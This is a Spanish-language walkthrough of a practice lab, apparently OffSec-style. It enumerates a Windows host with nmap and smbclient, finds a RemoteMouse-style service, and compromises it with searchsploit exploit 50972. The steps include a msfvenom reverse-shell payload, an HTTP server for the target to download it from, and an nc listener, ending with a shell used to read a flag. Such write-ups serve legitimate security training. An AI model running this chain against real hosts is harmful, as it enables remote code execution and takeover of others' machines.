# Walk: Public Exploit 01

## Fecha: 08/02/2025
## Host: Windows
## IP: 192.168.xxx.10
## Objetivo
Encontrar la vulnerabilidad y ejecutar el exploit correspondiente.
## Herramientas
1. smbclient
2. impacket
3. searchsploit
## Procedimiento y comandos
#### Paso 1:  Enumeracion con nmap
1. `nmap -sV -p- --script=banner,default 192.168.195.10 --min-rate 5000 -oN nmap-result.txt`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:00 -03
Nmap scan report for 192.168.195.10
Host is up (0.19s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 10 Pro 15063 microsoft-ds (workgroup: WORKGROUP)
1978/tcp  open  unisql?
|_banner: system windows 6.2\x0AluminateOK
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     system windows 6.2
|_    luminateOK
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49672/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.95%I=7%D=2/8%Time=67A7478E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(GenericLines,1E,"syst
SF:em\x20windows\x206\.2\nluminateOK\n")%r(GetRequest,1E,"system\x20window
SF:s\x206\.2\nluminateOK\n")%r(HTTPOptions,1E,"system\x20windows\x206\.2\n
SF:luminateOK\n")%r(RTSPRequest,1E,"system\x20windows\x206\.2\nluminateOK\
SF:n")%r(RPCCheck,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(DNSVersi
SF:onBindReqTCP,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(DNSStatusR
SF:equestTCP,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(Help,1E,"syst
SF:em\x20windows\x206\.2\nluminateOK\n")%r(SSLSessionReq,1E,"system\x20win
SF:dows\x206\.2\nluminateOK\n")%r(TerminalServerCookie,1E,"system\x20windo
SF:ws\x206\.2\nluminateOK\n")%r(TLSSessionReq,1E,"system\x20windows\x206\.
SF:2\nluminateOK\n")%r(Kerberos,1E,"system\x20windows\x206\.2\nluminateOK\
SF:n")%r(SMBProgNeg,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(X11Pro
SF:be,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(FourOhFourRequest,1E
SF:,"system\x20windows\x206\.2\nluminateOK\n")%r(LPDString,1E,"system\x20w
SF:indows\x206\.2\nluminateOK\n")%r(LDAPSearchReq,1E,"system\x20windows\x2
SF:06\.2\nluminateOK\n")%r(LDAPBindReq,1E,"system\x20windows\x206\.2\nlumi
SF:nateOK\n")%r(SIPOptions,1E,"system\x20windows\x206\.2\nluminateOK\n")%r
SF:(LANDesk-RC,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(TerminalSer
SF:ver,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(NCP,1E,"system\x20w
SF:indows\x206\.2\nluminateOK\n")%r(NotesRPC,1E,"system\x20windows\x206\.2
SF:\nluminateOK\n")%r(JavaRMI,1E,"system\x20windows\x206\.2\nluminateOK\n"
SF:)%r(WMSRequest,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(oracle-t
SF:ns,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(ms-sql-s,1E,"system\
SF:x20windows\x206\.2\nluminateOK\n")%r(afp,1E,"system\x20windows\x206\.2\
SF:nluminateOK\n")%r(giop,1E,"system\x20windows\x206\.2\nluminateOK\n");
Service Info: Host: REMOTEMOUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 15063 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: remotemouse
|   NetBIOS computer name: REMOTEMOUSE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-08T04:03:56-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h40m00s, deviation: 4h37m09s, median: 0s
| smb2-time: 
|   date: 2025-02-08T12:03:57
|_  start_date: 2024-03-28T14:52:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.65 second
```
Encontramos un puerto abierto que es algo inusual y el nombre del host que nos da un indicio de busqueda.

- open port **1978**.
- Host: **REMOTEMOUSE**; OS: Windows;
#### Paso 2:  Exploracion con smbclient
1. Intentamos listar recursos compartidos por **SMB**
- `smbclient -L //192.168.195.10/ -N`
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
offsec          Disk      
Users           Disk 
```
2.  Berificamos si tenemos acceso al recurso compartido sin credenciales:
- `smbclient //192.168.195.10/offsec -N ` 
> Y en efecto accedemos al recurso y podemos listar contenido
3. Buscando encontramos **_\Downloads\MouseServer.exe_** lo cual sumado con el nombre de host y el puerto nos da indicio para explorar un vector de ataque por medio de **RemoteMouse**.
4. Exploramos con **searchsploit** la db de exploits:
```
searchsploit remote mouse                                
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Hosting Controller 0.6.1 - User Registration (1)                                                                                                                                | windows/remote/979.txt
Hosting Controller 0.6.1 Hotfix 1.4 - Directory Browsing                                                                                                                        | windows/remote/675.txt
Hosting Controller 1.x/6.1 - Multiple Information Disclosure Vulnerabilities                                                                                                    | windows/remote/25194.txt
Micorosft Internet Explorer - SetMouseCapture Use-After-Free (Metasploit)                                                                                                       | windows/remote/28682.rb
Microsoft Internet Explorer 5.0.1 - Mouse Event URI Status Bar Obfuscation                                                                                                      | windows/remote/25095.txt
Microsoft Internet Explorer 5.0.1 - Popup.show Mouse Event Hijacking                                                                                                            | windows/remote/24266.txt
Microsoft Internet Explorer 6 < 10 - Mouse Tracking                                                                                                                             | windows/remote/23321.txt
Mini Mouse 9.2.0 - Remote Code Execution                                                                                                                                        | windows/webapps/49743.py
Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)                                                                                                                              | windows/remote/51010.py
Mozilla Browser 1.5 - URI MouseOver Obfuscation                                                                                                                                 | multiple/remote/23433.txt
Remote Mouse 4.002 - Unquoted Service Path                                                                                                                                      | windows/local/50258.txt
Remote Mouse GUI 3.008 - Local Privilege Escalation                                                                                                                             | windows/local/50047.txt
RemoteMouse 3.008 - Arbitrary Remote Command Execution                                                                                                                          | windows/remote/46697.py
TOTOLINK Routers - Backdoor / Remote Code Execution                                                                                                                             | hardware/webapps/37770.txt
uzbl 'uzbl-core' - '@SELECTED_URI' Mouse Button Bindings Command Injection                                                                                                      | linux/remote/34426.txt
WiFi Mouse 1.7.8.5 - Remote Code Execution                                                                                                                                      | windows/remote/49601.py
WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                                                                                                                  | windows/remote/50972.py
WiFi Mouse 1.8.3.2 - Remote Code Execution (RCE)                                                                                                                                | windows/remote/51072.py
WiFiMouse 1.8.3.4 - Remote Code Execution (RCE)                                                                                                                                 | windows/remote/51016.sh
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- Dadas las caracteristicas de la informacion obtenida seleccionamos el exploit que mejor se adapta con esta informacion:
> WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                                                                                                               | windows/remote/50972.py


#### Paso 3: Exploramos el exploit 50972 e intentamos implementarlo
1. Copiamos el exploit en el directorio de trabajo
- `searchsploit -m 50972`
2. Inspeccionamos un poco el codigo para entenderlo mejor y verificar sus requerimientos:
- `searchsploit -x windows/remote/50972.py`
3. Explorando el exploit vemos que requiere tres parametros: `<ip_victima><ip_atacante><reverse.exe>`

4. Generamos un payload com `msfvenom`:
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o reverse.exe`
5. Servimos el reverse.exe con python:
- `python3 -m http.server 80`
6. Activamos el receptor nc:
- `nc -lnvp 4444`
7. Ejecutamos el exploit:
- ` python3 50972.py 192.168.195.10 192.168.45.189:80 reverse.exe`

#### Paso 4: Obtenemos el flag.txt
1. Al ejecutar el exploit obtenemos en nuestro receptor nc un reverse shell.
2. Navegamos hasta Desktop del usuario offsec y obtenemos el flag:
`type flag.txt`
